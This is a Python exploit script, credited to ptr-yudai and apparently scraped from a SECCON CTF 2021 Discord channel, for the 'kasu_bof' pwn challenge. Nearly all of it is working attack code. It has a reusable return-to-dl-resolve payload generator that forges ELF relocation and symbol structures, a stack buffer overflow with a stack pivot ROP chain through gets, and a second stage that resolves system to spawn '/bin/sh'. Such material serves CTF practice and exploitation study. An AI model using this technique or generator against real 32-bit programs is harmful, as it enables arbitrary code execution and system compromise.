# author: ptr-yudai
# scraped from SECCON CTF 2021 Discord #pwn on 12/12/21

import os
from ptrlib import *
import time

HOST = os.getenv('SECCON_HOST', 'localhost')
PORT = os.getenv('SECCON_PORT', '9001')

try:
    elf = ELF("/app/chall")
except:
    elf = ELF("../files/kasu_bof/chall")
sock = Process("../files/kasu_bof/chall")
#sock = Socket(HOST, int(PORT))

def ret2dl(func='system', elf=None, addr=None):
    """
    Generate payload for return-to-dl-resolve attack

    `addr` can have the following keys:

     - payload  : Address to put fake struct. (Not required if `reloc`, `sym` are given.)
     - reloc    : Address to put fake Elf32_Rel struct (Not required if `payload` is given.)
     - sym      : Address to put fake Elf32_Sym struct (Not required if `payload` is given.)
     - .dynstr  : Address of .dynstr section. Not required if `elf` is given.
     - .dynsym  : Address of .dynsym section. Not required if `elf` is given.
     - .rel.plt : Address of .rel.plt section. Not required if `elf` is given.

    The return value is a list of the following tuple:

     (<address>, <data>)

    Args:
        elf : An ELF instance of the target program (Base address is required)
        addr: A dictionary having some address lists
    """
    given_addr = ['reloc', 'sym', 'symstr']

    if isinstance(func, str):
        func = str2bytes(func)

    if addr is None:
        addr = {}

    if elf and elf.elfclass != 32:
        logger.warning("64-bit ELF is not supported")
        return

    # Use the payload or specified address for some required addresses
    offset = 0

    if 'payload' not in addr:
        for required in given_addr:
            if required not in addr:
                logger.warning("`addr` must have 'payload' or '{}' key".format(
                    required
                ))
                return
        given_addr = [] # Nothing is given

    else:
        if 'reloc' not in addr:
            addr['reloc'] = addr['payload'] + offset
            given_addr.remove('reloc')
            offset += 4*2 # sizeof(Elf32_Rel)

        if 'sym' not in addr:
            addr['sym'] = addr['payload'] + offset
            offset += 4*4 # sizeof(Elf32_Sym)?
            given_addr.remove('sym')

        if 'symstr' not in addr:
            addr['symstr'] = addr['payload'] + offset
            offset += len(func) + 1 # strlen(func) + 1
            given_addr.remove('symstr')

        # Check GOT entry
        if 'got' not in addr:
            logger.warning("`addr` must have 'got' key (GOT entry to resolve)")
            return

    # Check some required ELF-specific addresses
    if '.dynsym' not in addr:
        if elf is None:
            logger.warning("`elf` or '.dynsym' key of `addr` is required")
            return
        addr['.dynsym'] = elf.section('.dynsym')

    if '.dynstr' not in addr:
        if elf is None:
            logger.warning("`elf` or '.dynstr' key of `addr` is required")
            return
        addr['.dynstr'] = elf.section('.dynstr')

    if '.rel.plt' not in addr:
        if elf is None:
            logger.warning("`elf` or '.rel.plt' key of `addr` is required")
            return
        addr['.rel.plt'] = elf.section('.rel.plt')

    payload = b''
    result = []

    # Align
    align_reloc = 0xc - ((addr['reloc'] - addr['.rel.plt']) % 0xc)
    addr['reloc']  += align_reloc
    addr['sym']    += align_reloc
    addr['symstr'] += align_reloc
    align_dynsym = 0x10 - ((addr['sym'] - addr['.dynsym']) & 0xf)
    addr['sym']    += align_dynsym
    addr['symstr'] += align_dynsym

    # Generate fake Elf32_Rel struct
    fake_reloc  = p32(addr['got'])
    fake_reloc += p32((((addr['sym'] - addr['.dynsym']) << 4) & ~0xff) | 7)
    if 'reloc' not in given_addr:
        payload += b'A' * align_reloc
        payload += fake_reloc
    else:
        result.append((addr['reloc'], fake_reloc))

    # Generate fake Elf32_Sym struct
    fake_sym  = p32(addr['symstr'] - addr['.dynstr']) # st_name
    fake_sym += p32(0)    # st_value
    fake_sym += p32(0)    # st_size
    fake_sym += p32(0x12) # st_info
    if 'sym' not in given_addr:
        payload += b'A' * align_dynsym
        payload += fake_sym
    else:
        result.append((addr['sym'], fake_sym))

    # Put function name
    if 'symstr' not in given_addr:
        payload += func + b'\x00'
    else:
        result.append((addr['symstr'], func + b'\x00'))

    if len(payload) > 0:
        result.append((addr['payload'], payload))

    reloc_offset = addr['reloc'] - addr['.rel.plt']

    return reloc_offset, result

addr_stage = elf.section('.bss') + 0x800
addr_fakeobj = addr_stage + 0x20

reloc_offset, writes = ret2dl(
    func='system',
    elf=elf,
    addr={'payload': addr_fakeobj,
          'got': elf.got('gets')}
)
addr_fakeobj, fakeobj = writes[0]

rop_pop1 = 0x080491ae
rop_pop_ebp = 0x080491ae
rop_leave = 0x080490e5
payload  = b'A'*0x84
payload += p32(0xdeadbeef) # saved ebp
payload += flat([
    # gets(addr_stage) ; read second rop chain
    elf.plt("gets"),
    rop_pop1, addr_stage,
    # stack pivot
    rop_pop_ebp,
    addr_stage - 4,
    rop_leave,
], map=p32)
assert is_gets_safe(payload)
sock.sendline(payload)

addr_binsh = addr_stage + 0x10
payload = flat([
    elf.section('.plt'),
    reloc_offset,
    0xdeadbeef,
    addr_binsh
], map=p32)
payload += b'/bin/sh\0'
payload += b'B' * (0x20 - len(payload))
payload += fakeobj
assert is_gets_safe(payload)
sock.sendline(payload)

sock.sh()
